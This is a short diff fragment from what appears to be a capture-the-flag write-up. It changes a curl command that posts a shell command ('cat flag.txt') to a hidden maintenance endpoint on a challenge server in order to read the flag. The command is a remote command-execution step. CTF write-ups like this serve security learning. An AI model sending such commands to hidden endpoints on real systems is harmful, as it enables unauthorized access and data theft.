@@ -42,7 +42,7 @@ xinet_startup.sh
 ```
 
 now we just need to get the flag.txt
-`curl -d "cmd=ls" http://challenge.acictf.com:48390/secret_maintenance_foo_543212345`
+`curl -d "cmd=cat+flag.txt" http://challenge.acictf.com:48390/secret_maintenance_foo_543212345`
 
 and we get the flag
 
